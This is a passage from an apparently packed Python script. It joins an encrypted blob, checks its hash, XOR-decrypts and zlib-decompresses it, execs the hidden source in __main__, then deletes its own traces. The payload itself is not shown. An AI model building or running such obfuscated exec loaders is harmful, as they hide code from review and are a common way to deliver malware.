_cyvBFiYFYLhfxY + _cxR9tPS2oOBKvH + _cu5c5io9ipF2xq + _cm0QJEn27UaRGG + _cbpu9xJ69Llw4P + _c_SksQk8Kj23K9 + _csAXB2WAVuSs7g + _cgXfI_B0rwbtsZ + _cnodPtS6n86Bo1 + _csN_SSyR3SCb6G + _couFHOaBvYn39Z + _cqAGL7retyxYm1 + _cbaP_734JHq2bO + _coxLQjxJyK6KGM + _cqBFruFqsQgrDX + _cabNqzqYc2wLme + _coXKVHZkudjzqc + _chBVLPQ0XLu4iU + _ccqo_Qiz1LYLmb + _cwmcnSlO9mN5bN + _cxggswloghgtvy + _cnUMpmwerxfv0Y + _ccmV68dqrJk1fb + _cer3jgwU4TZgal + _cinD68FroA5Sfb + _coBYYsBMFl550f + _cbFmIkcXotLSV4 + _cnnGMM7jchKVIe + _cfC5SvC7RkF5vS + _c_08n0Y4RmnUN3 + _cwt2zqEd9FUdZF + _cowXhXFChjaobe + _ccHS8TrXls4pVB + _cvKEIivrIUNms_ + _ciFfKUmvZo29Y9 + _cdl53C9_HOWmpK + _c_v7P5Ty9yibPh + _ct3IeHGrzuyfs2 + _cpLcbxgJ4hJ0r7 + _cmXeKSN5wqn9ez + _caMMjMLr7N5ico + _cuMM93QZgpw7dd + _cmUo6mNr7UI9DO + _czWdRC84jTZlr7 + _cxqktpxbs1aJj_ + _caPuH2bPLox3TA + _cexHXBb4p7g1LB + _cm0DemDIYTofHF + _cjH5rUUbjtr6gM + _cblMOwrdnwGXEV + _clXQdTCyzmIeoa + _cdq1wzYdfHW7BA + _ca81p9n6NjEyMV + _ceNw4fMRLiSyU8 + _chRhrH95qtFFpd + _cy1LO4YmiVvEO6 + _cdHwf6rP7Az3jg + _cnH8ZEXlvAwzkD + _cbrkvXyhFSqctn + _cdH4SxofrRXtGe + _cdaiMBPfPBCYzl + _ckN7YWnGlw0Hm4 + _cwPmpJKu35fDIX + _ceTHmxVVn8g09f + _cp3SpokA1_J0KZ + _cz0KsgwVIZblZp + _cvPwIfMadg9baP + _cbGcJ5Ku1qp85v + _c_PrKhMKEQg4ql + _cdryUyUh__HiTt + _cwx2zSdKiRtbdS + _caTR92zMifTdnF + _ccm_d_6jwsj0_T + _cmzvWVeJTfGzwQ + _cuPuvXo3VSjvYs + _clS72GkrpHa6mu + _caPYcI_cWo0M3T + _ctPzyKejLoK0GX + _crw_YkRXSJZTHO + _cxbyAiIWAo6594 + _ckAud2nzAKHkYT + _ctsPSncRT9aWnB + _c_jwBMiXIwQjwz + _cw5oTRKJonthEa + _ctyCAACEVGe5i7 + _cbC1yeAcaEHe42 + _ckCwFB0AyRdd8J + _cn37q2QQy7f1Y3 + _chV6ZhyBjrtryB + _cbSwltDL4xvfVE + _chU7WJQcaYIB81 + _crmOKG26V3W0JM + _cusnzzpcrhwYjL + _ch7qpR4XBMVyEu + _cjJhL1FmYqCgQB + _cm5lmi2m5xwo1g + _cdhqL2eFN22PA2 + _cpJs8LJZ41DltA + _cnXI5_g4tVKcWD + _cawhsYnc2IzycH + _coOWn7beSccSmJ + _cgv9xzbhYt6QV4 + _caDDcScVzU8qDx + _c_EKfVNmbXskVj + _cta7JjQeF66YXV + _cv2cpvFAcmz0NF + _ciBa1kD9X6uNmn + _cgifJy1AvxCcn9 + _cgskE22LeM5zIh + _cmv5QG1cA8l1Yz + _cepaSfxOJPRF19 + _cy1U05X5EtfUzR + _cc1J7WPAIBbTu_ + _cplBsHMjARp8VG + _cdCx4hgtqXk9gx + _cpCKLx7riVOFxo + _ctvyKeqOf5Ley4 + _cb00xEVh35Q0cj + _clCkXfk42CKzyw + _cyLXZVCTcKfOTF + _cwb3jYPD_9XSHY + _choh5_giyKyp9Y + _cuWHqI6OoM2B3v + _ctkWeU30gp9IhV + _ctS9YRGj8pw7lR + _ccYD2zWU4OCC1z + _cwqGNYu2fvD_3Z + _ccj9H4_4wn8bTG + _czTAZ5sYPgHgiP + _ciOvLdvY0h0BAL + _cmak38NLq_dvOQ + _ckCeBtKLDwz8zg + _cd1poHzLzKXz_J + _cuw2tTJpVBNi7Y + _cfEfc6UqtEa4fh + _coDX17JepBg4u2 + _coccSs5PmYlrdq + _cuNGtby58ailHz + _cdEoSXjO1i1Dol + _cc93YmWWWVkWa1 + _cns_CqhZ1gGm7O + _cd0MZFY0_0nQfM + _c_MjZICE1ulHAs + _cycUzPSXSJQjkQ + _crR5CvyTvCB2Lc + _cj78k0b2omGKqA + _cjYNZkcTplkkao + _crbcmiDSYy9Emn + _cqK88EwpGnxaED + _cihbGVfN7Fiyxi + _cpr_KI_iyeytFv + _ct0xRb6T4oPpyy + _cktcUL5AvSl2To + _cmyFePvvVKriRA + _crzRr1QFHQ8pep + _cqchBgd9eyIOEv + _cuSZYpaKytoxN6 + _cxEPEDf4tBZKA8 + _cwJ95EY1vQId3s + _cmFPl30Vvj8FvE + _cpLmGhtc1LJ_ls + _czyFIbC34ypyIE + _ccb86tgEyvRlq1 + _cnxtAbUIBZWXpV + _cjRt4rnuT31Q3T + _clJQNqzV1zQkx8 + _cfBZ8tcLYnb4C4 + _ck1AqEJ9EGxwuw + _cardOiBxnXXgef + _crjBb_6uXuX7Tt + _ci2cNrf4wuDg2j + _cyRwiHdL82FCqp + _ckFbTj5VnoPP1A + _cybdh28BSvW2AO + _cjUARGNKbK9FkF + _ca5O3XF8BSBE_L + _ccg5R3pqZOkDrD + _c_i_6WvHrZsUjR + _cqkA1br2kfILj2)
if __import__('hashlib').sha256(_plXxrHOidfp4qS).hexdigest() != '5b5be9ada2158e9355725a6ccb66ed9a3e385d8e65dbf5f2b126aee610324f5a':
    __import__('sys').exit(1)
_xd3VSSvyobTN_g = bytes([166, 93, 224, 158, 103, 65, 92, 80, 52, 105, 43, 46, 144, 37, 195, 143, 17, 80, 90, 249, 228, 143, 100, 2, 206])
_fkkgk2Bv5PAo8jx = bytes([61, 123, 140, 91, 197, 28, 120, 28, 117, 28, 247, 237, 46, 230, 127, 252, 91, 153, 123, 56, 15, 176, 83, 75, 127])

def _fxiGtCIn6Td_F7X(_bu5mTiLcpQHuF_, _ki9cEt7XrzxSTK):
    return bytes(_bu5mTiLcpQHuF_[_ifHztV0HVS9vLg] ^ _ki9cEt7XrzxSTK[_ifHztV0HVS9vLg % len(_ki9cEt7XrzxSTK)] for _ifHztV0HVS9vLg in range(len(_bu5mTiLcpQHuF_)))

def _fd_vtolMxbLGR2K(_tpzzTiEMbSg0wB):
    import zlib
    return zlib.decompress(_tpzzTiEMbSg0wB) # Un seul niveau de zlib ici pour simplifier

def _fes1wj995R5T6iV():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xlb6XENLyP0hPA = _fxiGtCIn6Td_F7X(_plXxrHOidfp4qS, _xd3VSSvyobTN_g)
    # 2. Décompression Zlib
    _du3o73P8VlEF6x = _fd_vtolMxbLGR2K(_xlb6XENLyP0hPA)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _du3o73P8VlEF6x.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nw2FZ8hJT6LAUD = _main.__dict__
    _nw2FZ8hJT6LAUD.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nw2FZ8hJT6LAUD)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fes1wj995R5T6iV()
try:
    del _fxiGtCIn6Td_F7X, _fd_vtolMxbLGR2K, _fes1wj995R5T6iV
    del _plXxrHOidfp4qS, _xd3VSSvyobTN_g, _fkkgk2Bv5PAo8jx
except:
    pass
